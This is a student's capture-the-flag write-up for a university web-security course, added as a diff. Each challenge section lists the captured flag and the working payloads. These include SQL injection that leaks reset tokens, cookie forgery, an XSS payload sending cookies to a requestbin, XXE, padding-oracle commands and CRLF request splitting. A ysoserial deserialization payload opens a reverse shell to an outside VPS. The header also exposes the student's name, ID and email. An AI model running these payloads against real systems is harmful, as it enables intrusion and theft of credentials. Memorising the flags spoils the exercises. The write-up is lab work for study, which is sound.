@@ -1,0 +1,205 @@
+Elias Groot, egt203, iel44jez, e.l.j.groot@student.vu.nl, 2703875
+
+# Cafe sequel
+flag: wsgi{fxX2BtnmrQzPBl2c}
+
+## Notes
+
+- sql injection on the coffee selection, experimented with ` ' " -- 
+- table users holds all users, but need to know which column holds the "favorite animal" data, can't guess this
+```
+1 UNION SELECT cid, type, name FROM pragma_table_info('users')
+```
+returns the columns in the table users -> found out that favorite animal is in column "security"
+
+then
+```
+1 UNION SELECT password, username, reset_token FROM users
+```
+leaks the reset token of all users and
+
+```
+1 UNION SELECT password, username, security FROM users
+```
+
+leaks the favorite animal of all users, can reset password for any user, got flag
+
+
+
+
+# Star space
+flag: flag{nZhMAjdD9PU3hhCo}
+
+## Notes
+
+- the auth_token cookie is used for authorization, can just set admin to true, base64 encode it and then send it to the server with the next request (the client can control the cookie content)
+
+
+
+
+# Darknet forum
+flag: flag{jA54XhtoWWkh5bhF}
+
+## Notes
+
+- huh?
+    - I think the vulnerability has something to do with redirects? in my browser I get redirect to the login page when I try to open the flag challenge forum post
+        - but in burp I immediately see the flag value, before the redirect
+        - the HTTP 302 is performed and burp follows it, but the HTTP body still shows the forum post content, even when not logged in
+
+
+
+
+
+# Dumpster
+flag: flag{6OvBt9o1MxAs2dq6}
+
+## Notes 
+- first thought this was an SSRF vuln, because the server will send a request to an URL through the bug report
+    - whitelisted with `websec.vusec.net` but can be circumvented with short urls like `https://google.com#websec.vusec.net` -> using tiny.cc this can make the server make a request to requestbin, but not of much use
+- then saw that in the source of the GIF dumpster, the `over18` argument is set in the HTML input tag using `.setInnerHTML`. Can let the server render this URL and then execute script -> reflected xss
+    - though, `.setInnerHTML` will avoid executing script tags set through it as a prevention measure
+        - but can add an image with a non-existent src and then use the `onerror` handler to execute a script: `<img src='x' onerror='alert("yo")'>
+            - tried to make the onerror do a fetch to my requestbin with its cookies, but did not work, it does seem to load the image source though
+            - then tried to update the image source on error so that the javascript `document.cookie` can be injected: `onerror='this.src=RQBIN.com/?' + document.cookie`
+                - this worked, and the web server actually fetches the new source as well, nice
+                - it fetched the new source (rqbin) with `?pw=supersecureadminpw`, nice and secure
+                    - then use this as the cookie for making a request to /admin.php (which is done by cookiecheck on the first page load in an AJAX request)
+                    
+- final payload for replacing the URL of an image with an invalid src (to make a rqbin request):
+http://websec.vusec.net:63911/93jUDxbw/dumpster.html?vid=3&over18=yes%22%3EEli%20%3Cimg%20src=x%20onerror=%22this.src=%27https://en7ro7ej230wc.x.pipedream.net?%27%2Bdocument.cookie%22%3E
+
+
+
+
+
+
+# Social
+flag: wsgi{hIauop2PeRx8aXDE}
+
+## Notes
+
+- many things tried, first see if I can upload PHP code, SSI code or any executables for a web shell
+    - even tried with exfitool, executable code as metadata, appending bytes, nothing works
+    - seems to be a Python flask server, PHP probably does not work anyway
+    - tried to upload very small image, see that it got resized. JPGs get converted to PNG
+    - tried to use username to make things executable, does not work
+- tried to upload SVG. This is supported. Tried SVG XXE from Portswigger: https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload
+    - can see text! but is wrapped with lorem ipsum. leuk. image is cropped so can only see very small part of the text. heel leuk
+    - tried to load the text to a requestbin by using external DTDs, loading external images, etc. all blocked
+    - there probably is a better way, but let's bruteforce it then. Use OCR in python to help automate, use cookies from existing session in browser
+        - this works, find the flag in ~ 16 images, print multiple (shifted lines) per image
+        - got the flag, but does not work? 
+            - oh OCR interprets the I as l. leuk
+
+- honestly, to really see my progress, my uploaded images tell it all
+
+
+
+
+# Siri
+flag: tomcat{Par1Bk1B4PWJnQEa}
+
+## Notes
+
+- this is a java deserialization vuln, the app state to deserialize is set as a cookie. Tried to decode with base64 and can see some java strings, then tried with SerializationDumper https://github.com/NickstaDB/SerializationDumper to see more info, but still no clear gadgets
+- tried to inject custom serializations using yoserial first. tried with username (removing maxlength=40) but this bricked my siri setup (only returned "0"), oops. sorry Floris
+- then tried to replace the cookie with a yoserialization payload. Set up a requestbin and executed a curl command to the requestbin:
+
+```
+java -jar ysoserial-all.jar CommonsCollections1 "curl requestbinurl.com" | base64 -w0
+```
+
+- but no CURL request, nothing came in. Then tried with different versions of CommonsCollections, for 2 and 4 got the error "class not found" (so I am getting somewhere?) and for 5 I saw a request pop up in requestbin, nice
+- tried to set up a reverse shell using a digitalocean VPS. Can't use piping directly (needed to redirect shell in- and outputs), so base64 encoded the following payload:
+```
+# start reverse shell to my VPS nc listener
+bash -i >& /dev/tcp/104.248.91.239/999 0>&1
+```
+- converted this to base64 and then used yoserial with CommonsCollections5 to run
+```
+java -jar ysoserial-all.jar CommonsCollections5 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDQuMjQ4LjkxLjIzOS85OTkgMD4mMQo=}|{base64,-d}|{bash,-i}" | base64 -w0
+```
+
+- now I am in, can execute shell commands on the websec server. nice.
+- looking around, the interesting stuff is probably in /var/websec, can access this dir but cannot list it. annoying (only x permission, not r)
+- tried to look around for a bit, scan and bruteforce some dirs. I remember that there was a flag for social in "/var/websec/wwwstudent_12" can access this directory, nice!
+    - but the same problem again. annoying. cannot list any files or folders
+    - tried to use `find` to find files matching the "flag{}" pattern, but does not work if you cannot list dirs. tried to enter other students directories but cannot because I am not the right group
+        - used `groups` to find out which group I actually am
+            - am in group wwwchallenge_06, nice. that must be siri
+            - took a look at the flag for social again. see that the flag was in level01, would /var/websec/wwwstudent_12/level06 work?
+                - it does, really nice. Tried flag.txt and this time it worked
+
+- please don't mind me looking around the scoreboard PHP files. Too bad there are no bonusses anymore...
+
+
+
+
+
+# Gloria foster
+flag: flag{WkKBrCr0WYvx62WJ}
+
+## Notes
+
+- this is a padding oracle attack, server exposes if padding is incorrect and already gives us an encrypted value
+    - also a CBC encryption, so requirements met
+    - used padBuster (https://github.com/AonCyberLabs/PadBuster) to use the padding oracle:
+
+```
+sudo perl padBuster.pl http://websec.vusec.net:62039/GdoioDWi/cgi-bin/index.php jiB9eXhTEEVeMlhGU+E9axj0Ii0cVyTjQkPDukq9PhAvr4kbAuSiLfc4izahT9ss 16 -usebody -cookies PHPSESSID=03sqskm1ffl0g0u83vopj48i7h -post "cipher_input=jiB9eXhTEEVeMlhGU+E9axj0Ii0cVyTjQkPDukq9PhAvr4kbAuSiLfc4izahT9ss" -l "that's the flag"
+```
+
+
+
+
+
+
+# Flag viewer
+flag: flag{llmmFNnEY8b22KFv}
+
+## Notes
+
+- tried first with several characters, ' " ` and #
+    - `#` gives a warning that the web server had a request error, showing some of the response made internally to /backend.php but not of much use
+    - probably not a cache poisoning or proxy parsing discrepancy vuln, as there is no cache and it is clear that there is a PHP request being made from the PHP script
+
+- "works.php" gives away that there is a possibilty for request splitting, using CRLF which is url encoded as %0d%0a
+- tried some basic payloads for "country" with burp. See if I can make a request to my requestbin. This payload gives two responses:
+```
+NL%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/backend.php%20HTTP/1.1%0d%0aHost:%20enipetl9joz2p.x.pipedream.net%0d%0a%0d%0a
+```
+    - a 404 and a 400
+        - the 400 is likely due to the secend request being a GET request instead of a POST
+            - confirmed, changing to POST returns the NL flag
+```
+VU%0d%0aContent-Length:%200%0d%0a%0d%0aPOST%20/backend.php%20HTTP/1.1%0d%0aHost:%20enipetl9joz2p.x.pipedream.net%0d%0a%0d%0a
+```
+- went over the list of flags, saw VU flag but needs the "Secure-Request" header to be set
+- tried to inject the Secure-Request header manually
+```
+NL%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/backend.php%20HTTP/1.1%0d%0aSecure-Request:%20enipetl9joz2p.x.pipedream.net%0d%0a%0d%0a
+```
+- tried with different hosts
+```
+country=VU%0d%0aGET%20/backendje.php%20HTTP/1.1%0d%0aHost:%20localhost:62886
+```
+
+- this seems to work sometimes, using the above payloads gave me two responses so request splitting definitely works, but still no way to set the endpoint. When I change GET into POST, everything works normally and have nothing to explore further
+
+- know that country=# would give an error, so try to replicate that in my normal POST request to index.php (which also runs on apache, so should give the same error for the same payload)
+    - inserting a # into any header does not cause an error
+    - inserting a # into the POST body does not cause an error
+    - inserting a # into the path does cause an error!! (i.e. `POST /K59z1TeP/cgi-bin/index.php# HTTP/1.1`)
+        - so this probably means that `country` is injected as GET parameter, like so: `POST /backend.php?country=$country HTTP/1.1`
+            - then experimenting is easy, nice. Can follow closely with my first POST request to see if expected output matches
+                - first tried setting country to `VU%20HTTP/1.1` which crashes as expected (becomes `POST /backend.php?country=VU HTTP/1.1 HTTP/1.1`)
+                - so need to move the second "leftover" HTTP/1.1 to the next line, to make it become meaningless and not cause request errors
+                    - this can be done by making it a header value. we want to set the Secure-Request anyway so this solves two problems in one
+                        - tried setting country to `VU%20HTTP/1.1%0d%0aSecure-Request:%20` which would become  
+                            `POST /backend.php?country=VU HTTP/1.1 
+                             Secure-Request: HTTP/1.1`
+                             due to the line break introduced by CRLF (%0d%0a)
+                            - did not work
+                                - stupid, added the %20 at the end for a space between header and value but that space was already there
+                                - so setting country to `VU%20HTTP/1.1%0d%0aSecure-Request:` did work (in Burp, browser escapes crlf bytes)
